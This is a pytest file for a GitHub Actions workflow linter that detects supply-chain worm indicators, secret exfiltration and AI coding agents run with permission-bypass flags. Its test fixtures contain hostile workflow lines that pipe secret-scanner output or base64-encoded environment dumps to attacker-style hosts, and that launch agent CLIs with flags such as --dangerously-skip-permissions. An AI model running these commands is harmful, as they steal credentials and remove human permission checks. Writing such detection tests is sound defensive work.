"""Per-rule tests for the GHA-05x supply-chain-worm IOC pack:
GHA-056 (known worm IOC strings — Shai-Hulud / s1ngularity),
GHA-057 (secret scanner output piped to network egress),
GHA-058 (agentic CLI invoked with permission-bypass flags).
"""
from __future__ import annotations

from .conftest import run_check

# ── GHA-056 known worm IOC strings ───────────────────────────────────


class TestGHA056WormIndicators:
    def test_fails_on_shai_hulud_workflow_filename(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            permissions: { contents: write }
            steps:
              - run: |
                  cat > .github/workflows/shai-hulud-workflow.yml <<'EOF'
                  name: x
                  on: push
                  jobs: { y: { runs-on: ubuntu-latest, steps: [{run: 'echo'}] } }
                  EOF
        """
        f = run_check(wf, "GHA-056")
        assert not f.passed
        assert "shai-hulud" in f.description.lower() or "worm" in f.description.lower()

    def test_fails_on_known_webhook_uuid(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: curl https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d @creds
        """
        f = run_check(wf, "GHA-056")
        assert not f.passed

    def test_fails_on_s1ngularity_repo_name(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: gh repo create "$USER/s1ngularity-repository-42" --public
        """
        f = run_check(wf, "GHA-056")
        assert not f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: npm test
        """
        f = run_check(wf, "GHA-056")
        assert f.passed


# ── GHA-057 secret scanner exfil ─────────────────────────────────────


class TestGHA057SecretScannerExfil:
    def test_fails_on_trufflehog_piped_to_curl(self):
        wf = """
        name: ci
        on: push
        jobs:
          harvest:
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json | curl -X POST --data-binary @- https://attacker.example/
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_fails_on_gitleaks_piped_to_gh_api_post(self):
        wf = """
        name: ci
        on: push
        jobs:
          harvest:
            runs-on: ubuntu-latest
            steps:
              - run: gitleaks detect --report-format json --report-path /dev/stdout | gh api -X POST /repos/attacker/loot/issues -f title=hi
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_fails_on_trufflehog_under_pull_request_target(self):
        wf = """
        name: ci
        on:
          pull_request_target:
            types: [opened]
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_passes_on_scanner_writing_to_workspace_only(self):
        wf = """
        name: ci
        on: push
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json > findings.sarif
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: npm test
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_fails_on_pipeline_split_by_backslash_continuation(self):
        # The exact exploit-example shape: trufflehog and curl on
        # separate YAML lines joined by a trailing ``\``. The detector
        # must fold the continuation before splitting on ``|``.
        wf = """
        name: ci
        on: push
        jobs:
          harvest:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  trufflehog filesystem . --json \\
                    | curl -X POST --data-binary @- \\
                        https://webhook.site/abc
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed
        assert "piped to network egress" in f.description.lower()

    def test_passes_when_step_if_restricts_to_push(self):
        # Workflow declares pull_request_target alongside push, but the
        # scanner step is gated on github.event_name == 'push', so the
        # untrusted path is unreachable.
        wf = """
        name: ci
        on: [push, pull_request_target]
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - if: github.event_name == 'push'
                run: trufflehog filesystem . --json > findings.sarif
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_passes_when_job_if_restricts_to_push(self):
        wf = """
        name: ci
        on: [push, pull_request_target]
        jobs:
          scan:
            if: ${{ github.event_name == 'push' }}
            runs-on: ubuntu-latest
            steps:
              - run: trufflehog filesystem . --json > findings.sarif
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_fails_when_if_predicate_mentions_untrusted_trigger(self):
        # A predicate that *includes* an untrusted trigger doesn't restrict.
        wf = """
        name: ci
        on: [push, pull_request_target]
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - if: ${{ github.event_name == 'push' || github.event_name == 'pull_request_target' }}
                run: trufflehog filesystem . --json
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed

    def test_fails_on_cicd_goat_scenario_24_body(self):
        # Body lifted from cicd-goat scenario-24-third-party-webhook-exfil.
        # No literal ``secrets.*`` reference; the exfil happens via
        # ``$(env | base64)`` in the curl payload. The env-dump shape
        # is enough to trigger the third detector even on a workflow
        # that doesn't otherwise touch secrets.
        wf = """
        name: scenario-24-third-party-webhook-exfil
        on:
          push:
          pull_request:
        permissions:
          contents: read
        jobs:
          notify:
            if: false
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - name: Build telemetry to third-party tracker (DANGER)
                run: |
                  curl -fsS -X POST "https://build-tracker.third-party.example/v1/events" \\
                    -H "Content-Type: application/json" \\
                    -d "$(jq -nc \\
                        --arg repo  "$GITHUB_REPOSITORY" \\
                        --arg actor "$GITHUB_ACTOR" \\
                        --arg sha   "$GITHUB_SHA" \\
                        --arg env_dump "$(env | base64 -w0)" \\
                        '{repo:$repo, actor:$actor, sha:$sha, env_dump:$env_dump}')"
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed
        assert "third-party host" in f.description

    def test_fails_on_curl_post_with_secrets_interpolation_to_third_party(self):
        wf = """
        name: ci
        on: push
        jobs:
          notify:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  curl -X POST https://hooks.example.com/incoming \\
                    -H "Authorization: Bearer ${{ secrets.OPS_TOKEN }}" \\
                    -d "{}"
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed
        assert "secrets.* interpolated" in f.description

    def test_fails_on_curl_post_with_credential_env_var_to_third_party(self):
        wf = """
        name: ci
        on: push
        jobs:
          notify:
            runs-on: ubuntu-latest
            env:
              OPS_TOKEN: ${{ secrets.OPS_TOKEN }}
            steps:
              - run: |
                  curl -X POST https://hooks.example.com/in \\
                    -H "Authorization: Bearer $GITHUB_TOKEN"
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed
        assert "credential env var" in f.description

    def test_passes_on_curl_post_to_github_host(self):
        # GitHub-owned host with secrets interpolation is the normal
        # ``gh api`` / ``actions/upload-artifact`` shape — must not fire.
        wf = """
        name: ci
        on: push
        jobs:
          notify:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  curl -X POST https://api.github.com/repos/x/y/issues \\
                    -H "Authorization: Bearer ${{ secrets.GH_PAT }}" \\
                    -d '{"title":"hi"}'
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_passes_on_curl_post_to_third_party_without_secret_material(self):
        # ``curl POST`` to a third-party host without any secret
        # interpolation, credential env, or env-dump shouldn't fire —
        # the rule is exfil-shaped, not "any HTTP POST is bad".
        wf = """
        name: ci
        on: push
        jobs:
          notify:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  curl -X POST https://status.example.com/heartbeat \\
                    -d '{"build":"ok"}'
        """
        f = run_check(wf, "GHA-057")
        assert f.passed

    def test_evil_lookalike_host_does_not_pass_allowlist(self):
        wf = """
        name: ci
        on: push
        jobs:
          notify:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  curl -X POST https://evil-github.com/x \\
                    -d "$(env)"
        """
        f = run_check(wf, "GHA-057")
        assert not f.passed


# ── GHA-058 agentic CLI permission-bypass flags ──────────────────────


class TestGHA058AICLIUnsafeFlags:
    def test_fails_on_claude_dangerously_skip_permissions(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  npm i -g @anthropic-ai/claude-code
                  claude --dangerously-skip-permissions -p "walk fs"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed
        assert "claude" in f.description.lower() or "bypass" in f.description.lower()

    def test_fails_on_gemini_yolo(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: gemini --yolo -p "do the thing"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fails_on_q_trust_all_tools(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: q chat --trust-all-tools "explain"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fails_on_cursor_agent_invocation(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: cursor-agent --task "audit the repo"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fails_on_allowedtools_wildcard(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: claude --allowedTools "*" -p "anything goes"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_passes_on_scoped_allowedtools(self):
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: claude --allowedTools "Read,Grep" -p "summarize"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_passes_on_tool_name_containing_substring_all(self):
        # Regression: the old regex matched the literal substring "all"
        # anywhere in the value, so CallTool / rally / "Read,Grep,All"
        # tripped a false positive. The anchored alternation must reject
        # these.
        wf = """
        name: ci
        on: push
        jobs:
          agentic:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  claude --allowedTools CallTool -p "x"
                  claude --allowedTools rally -p "y"
                  claude --allowedTools "Read,Grep,All" -p "z"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - run: npm test
        """
        f = run_check(wf, "GHA-058")
        assert f.passed


# ── GHA-058 PR-checkout topology widening (zizmor #1605 / #1607) ─────


class TestGHA058PRCheckoutTopology:
    """Step-order detection: agentic CLI runs in a job after a PR-head
    checkout while a write-scope token is in scope. The bypass flag
    itself is NOT required, the topology IS the bug.
    """

    def test_fires_after_pr_head_checkout_with_default_perms(self):
        # No ``permissions:`` block means the runtime default carries
        # ``contents: write``; the topology fires on the bare CLI
        # invocation with no flag at all.
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - run: claude -p "review this PR"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed
        assert "PR-head checkout" in f.description

    def test_fires_when_job_permissions_write_all(self):
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions: write-all
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.head_ref }}
              - run: gemini -p "summarize this PR"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_fires_on_refs_pull_head_literal(self):
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: refs/pull/123/head
              - run: claude --allowedTools Read,Grep -p "review"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed

    def test_passes_with_no_pr_head_checkout(self):
        # An agentic CLI in CI with no PR-head checkout in the same
        # job is not the topology this widening targets.
        wf = """
        name: docs
        on: push
        jobs:
          regen:
            runs-on: ubuntu-latest
            permissions: write-all
            steps:
              - uses: actions/checkout@v4
              - run: claude --allowedTools Write -p "regen docs"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_passes_when_explicit_read_only_permissions(self):
        # Read-only permissions block defangs the topology, the agent
        # has no write-token to exfiltrate.
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions:
              contents: read
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - run: claude --allowedTools Read -p "review"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_passes_when_agentic_step_precedes_checkout(self):
        # Step order matters; an agent invoked BEFORE the PR-head
        # checkout has no contributor-controlled tree on disk yet.
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            steps:
              - run: claude --allowedTools Read -p "preflight"
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_fires_id_token_write_only(self):
        # ``id-token: write`` is a write-class token even when other
        # scopes are read; the topology still applies.
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions:
              contents: read
              id-token: write
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - run: aider --auto -p "summarize"
        """
        f = run_check(wf, "GHA-058")
        # aider --auto also matches the bypass-flag shape (--auto is
        # in the bypass list). Either signal is enough; assert it
        # fires.
        assert not f.passed

    def test_topology_fires_per_job_not_cross_job(self):
        # PR-head checkout in job A should NOT make an agent in job B
        # fire (different runner, no shared filesystem).
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          checkout-only:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
          agent:
            runs-on: ubuntu-latest
            permissions: write-all
            steps:
              - run: claude --allowedTools Read -p "review"
        """
        f = run_check(wf, "GHA-058")
        assert f.passed

    def test_pull_request_target_head_ref_variant(self):
        wf = """
        name: pr-review
        on: pull_request_target
        jobs:
          review:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request_target.head.sha }}
              - run: q chat --trust-tools fs_read -p "review"
        """
        f = run_check(wf, "GHA-058")
        assert not f.passed
